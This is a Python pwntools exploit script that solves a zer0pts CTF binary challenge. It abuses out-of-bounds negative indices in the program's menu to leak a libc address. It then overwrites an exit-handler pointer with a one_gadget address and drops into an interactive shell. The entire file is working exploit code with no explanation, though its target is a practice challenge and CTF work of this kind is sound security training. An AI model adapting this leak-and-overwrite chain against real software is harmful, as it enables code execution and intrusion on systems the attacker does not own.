#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = 'pwn.ctf.zer0pts.com', 9001
binary = './chall'
brkpts = '''
b malloc
b execve
'''

elf = ELF("chall")
libc = ELF("libc.so.6")

#context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
#context.log_level = "debug"
#context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

if len(sys.argv) > 1:
    io = remote(remote_ip, port)

else:
    io = process(binary, env = {'LD_PRELOAD' : './libc.so.6'})

def choice(idx):
    sla(">> ", str(idx))

def push(val):
    choice(1)
    sla("value: ", str(val))

def pop():
    choice(2)

def store(idx, val):
    choice(3)
    sla("index: ", str(idx))
    sla("value: ", str(val))

def leak(idx):
    choice(4)
    sla("index: ", str(idx))

def wipe():
    choice(5)

def getupper(val):
    return (val & 0xffffffff00000000) >> 32

def getlower(val):
    return val & 0xffffffff

if __name__ == "__main__":
    for i in range(0x205):
        print(i)
        push(i)
    for i in range(0x205*2):
        print(i)
        pop()
    leak(-1030)
    reu("value: ")
    val = int(rl().strip()) << 32
    leak(-1031)
    reu("value: ")
    val += int(rl().strip())
    libc.address = val - 0x1ebbe0
    log.info("Libc : "+hex(libc.address))
    hook = libc.symbols['__malloc_hook']
    exitp = libc.address + 0x1ed500
    system = libc.symbols['system']
    gadget = libc.address + [0xe6c7e, 0xe6c81, 0xe6c84, 0xe6e73, 0xe6e76][1]
    binsh = 0x0068732f6e69622f
    wipe()
    for i in range(5):
        push(i)
    for i in range(25):
        pop()
    store(-16, getlower(exitp))
    store(-15, getupper(exitp))
    wipe()
    push(getlower(gadget))
    push(getupper(gadget))
    #gdb.attach(io, brkpts)
    #sl("6")

    io.interactive()
